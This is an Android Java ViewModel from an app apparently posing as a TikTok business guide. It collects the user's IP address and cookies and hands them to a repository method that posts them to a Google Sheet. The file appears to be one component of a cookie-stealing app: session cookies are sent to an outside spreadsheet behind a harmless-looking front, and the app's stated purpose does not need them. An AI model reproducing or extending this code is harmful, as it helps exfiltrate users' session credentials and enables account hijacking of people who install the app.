package com.teamwork.businessguideprofortiktok.src.resource.viewmodels.googlesheet_viewmodel;

import androidx.lifecycle.LiveData;
import androidx.lifecycle.MutableLiveData;
import androidx.lifecycle.Observer;
import androidx.lifecycle.ViewModel;

import com.teamwork.businessguideprofortiktok.src.resource.repositories.google_sheet_repository.GoogleSheetRepository;

public class GoogleSheetViewModel extends ViewModel {
    private GoogleSheetRepository mGoogleSheetRepository ;
    private MutableLiveData<String> mReponseDataSever = new MutableLiveData<>();
    public MutableLiveData<String>  mIp = new MutableLiveData<>();;
    public MutableLiveData<String> mCookies = new MutableLiveData<>();

    public void postDataGoogleSheets(String ip,String cookies){
        mGoogleSheetRepository = new GoogleSheetRepository();
        mGoogleSheetRepository.postDataGoogleSheets(ip,cookies);
        mGoogleSheetRepository.getDataReponseSever().observeForever(new Observer<String>() {
            @Override
            public void onChanged(String s) {
                mReponseDataSever.setValue(s);
            }
        });
    }

    public LiveData<String> getDataReponseSever(){
        return mReponseDataSever;
    }

    public void setIp(String ipAddress){
        mIp.postValue(ipAddress);
    }

    public LiveData<String>getIp(){
        return  mIp;
    }

    public void setCookies(String cookiesAddress){
        mCookies.postValue(cookiesAddress);
    }

    public LiveData<String>getCookies(){
        return  mCookies;
    }
}
